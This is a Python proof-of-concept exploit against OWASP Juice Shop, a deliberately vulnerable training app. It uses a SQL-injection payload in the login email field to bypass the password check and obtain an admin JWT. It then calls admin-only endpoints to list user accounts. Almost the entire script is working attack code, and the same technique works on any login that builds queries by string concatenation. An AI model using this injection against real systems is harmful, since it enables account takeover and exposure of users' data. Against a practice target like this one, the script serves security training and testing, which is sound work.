#!/usr/bin/env python3
"""
PoC 1 - SQL Injection -> Authentication Bypass (admin account takeover)
Target: OWASP Juice Shop 20.3.0  (http://host.docker.internal:3000)
Vuln:   POST /rest/user/login builds its SQL query by string concatenation:
            SELECT * FROM Users WHERE email = '<email>' AND password = '<hash>'
        Injecting a comment in the email field drops the password check, so the
        first row (id=1, admin@juice-sh.op) is returned -> valid admin JWT.
Impact: Full authentication bypass + admin session without knowing any password.

Usage: python3 poc1_sqli_login_bypass.py
"""
import base64
import json
import sys

import requests

BASE = "http://host.docker.internal:3000"
PAYLOAD = "admin@juice-sh.op'--"      # comment out "AND password = ..."


def b64d(part: str) -> bytes:
    return base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))


def main() -> int:
    s = requests.Session()

    print("[*] Baseline: wrong password for admin")
    r = s.post(f"{BASE}/rest/user/login",
               json={"email": "admin@juice-sh.op", "password": "definitely-wrong"})
    print(f"    HTTP {r.status_code} -> {r.text[:120]}")

    print(f"\n[*] Exploit: email = {PAYLOAD!r}, password = 'x'")
    r = s.post(f"{BASE}/rest/user/login",
               json={"email": PAYLOAD, "password": "x"})
    print(f"    HTTP {r.status_code}")
    if r.status_code != 200 or "token" not in r.text:
        print("[-] Exploit failed")
        return 1

    auth = r.json()["authentication"]
    token = auth["token"]
    body = json.loads(b64d(token.split(".")[1]))
    print(f"    JWT issued, umail={auth.get('umail')}  bid={auth.get('bid')}")
    print("    Decoded JWT data:")
    for k in ("id", "email", "role", "password"):
        print(f"      {k:9s}= {body['data'].get(k)}")

    if body["data"].get("role") != "admin":
        print("[-] Did not get the admin role")
        return 1

    h = {"Authorization": f"Bearer {token}"}

    print("\n[*] Verifying the token against privileged endpoints")
    r = s.get(f"{BASE}/rest/user/whoami", headers=h)
    print(f"    GET /rest/user/whoami -> {r.status_code} {r.text[:200]}")

    r = s.get(f"{BASE}/api/Users", headers=h)
    try:
        users = r.json()["data"]
    except Exception:
        print(f"    GET /api/Users -> {r.status_code} {r.text[:200]}")
        return 1
    print(f"    GET /api/Users -> {r.status_code}, {len(users)} accounts exposed (admin-only endpoint)")
    for u in users[:5]:
        print(f"      id={u['id']:<3} {u['email']:<28} role={u['role']}")

    print("\n[+] VULNERABLE: logged in as admin with no credentials.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
